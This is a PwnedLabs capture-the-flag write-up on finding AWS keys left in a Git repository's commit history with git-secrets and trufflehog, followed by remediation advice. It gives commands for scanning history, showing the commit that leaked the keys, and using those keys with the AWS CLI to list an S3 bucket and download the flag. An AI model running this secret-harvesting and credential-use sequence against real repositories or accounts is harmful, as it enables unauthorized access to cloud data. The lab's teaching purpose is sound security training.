## Disclosure
This documentation is intended for educational purposes only. All activities were performed within a controlled, authorized environment provided by [PwnedLabs](https://pwnedlabs.io/). This write-up focuses strictly on the methodology, vulnerability analysis, and security remediation techniques. All sensitive identifiers, including credentials, tokens, and specific PII, have been redacted or generalized to comply with security best practices and the platform's Terms of Service. The intent of this content is to foster professional development and contribute to the cybersecurity community's knowledge base.

**The lab:** pwnedlabs.io/labs/hunt-for-secrets-in-git-repos

---
## Vulnerability Summary
The environment is vulnerable to **Information Disclosure** due to the inclusion of 
sensitive AWS IAM credentials within the version control history of a public 
(or accessible) Git repository.

1. **Credential Exposure in Code**: Developers inadvertently committed hardcoded AWS 
   Access Keys and Secret Keys into a PHP script (`log-upload.php`) within the 
   repository.
2. **Historical Retention**: Even after the sensitive code was modified or deleted, the 
   credentials remained accessible in the Git history, which is not automatically 
   cleared by subsequent commits.
3. **Automated Secret Discovery**: Using tools like `git-secrets` and `trufflehog`, 
   attackers can scan the commit history (`git secrets --scan-history`) to 
   programmatically locate and exfiltrate these historical secrets.
4. **Impact**: Exfiltrated credentials provided unauthorized access to the `huge-logistics-transact` 
   S3 bucket, leading to the compromise of sensitive data and flags.

---
## Walkthrough
GitHub repo: `https://github.com/huge-logistics/cargo-logistics-dev`

Manually navigate to the git repo and also clone it for manual inspection:

```bash
git clone https://github.com/huge-logistics/cargo-logistics-dev
```

Download and use the tool `git-secrets`

```bash
git clone https://github.com/awslabs/git-secrets
cd git-secrets
make install

cd cargo-logistics-dev/
git secrets --install
git secrets --register-aws
git secrets --scan
git secrets --scan-history
	...log-upload.php          'key'
	...log-upload.php          'secret'
```

The history scan revealed a commit with a `.php` file that contains AWS secrets. Show that commit and use the AWS creds to authenticate:

```bash
git show abcdefg0123456789abcdefg0123456789:log-s3-test/log-upload.php
	region
	key
	secret
	bucket
```

AWS configure and list files in the bucket, get flag:
```bash
aws configure --profile git
aws sts get-caller-identity --profile git
aws s3 ls huge-logistics-transact --profile git
aws s3 cp s3://huge-logistics-transact/flag.txt . --profile git
```

Can also find secrets in Git repos with `trufflehog`:
```bash
pip install trufflehog       # Exegol/docker
brew install trufflehog     # Mac
apt install trufflehog        # Debian

Or:

git clone https://github.com/trufflesecurity/trufflehog/; cd trufflehog
go install

trufflehog git file://cargo-logistics-dev/ --regex --no-entropy
trufflehog git https://github.com/huge-logistics/cargo-logistics-dev --max-depth 2
```

---
## Remediations
1. **Prevent Secret Commits**:
   - Install and configure `git-secrets` or similar pre-commit hooks to block 
     commits containing patterns matching AWS access keys, API keys, or private keys.
   - Use centralized secret scanning platforms (e.g., GitHub Advanced Security, 
     Gitleaks) to detect and block secrets before they enter the repository.

2. **Remediate Exposed Secrets**:
   - **Immediately rotate** any AWS credentials found in Git history. Assume 
     they are compromised as soon as they reach a repository.
   - If secrets were committed, do not simply delete the files; you must purge the 
     commits from history using tools like `git filter-repo` or `BFG Repo-Cleaner` 
     (though rotation remains the primary security control).

3. **Secure Configuration Management**:
   - Utilize environment variables, `AWS Secrets Manager`, or `Parameter Store` 
     instead of hardcoding credentials in application files.
   - Employ `IAM Roles` for tasks running on EC2 or Lambda to avoid long-lived 
     access keys entirely.

4. **Repository Hygiene**:
   - Audit all internal and public repositories for historical secrets.
   - Implement policies requiring developers to never push local configuration files 
     (e.g., `.env`, `credentials`, `config`) to remote repositories.
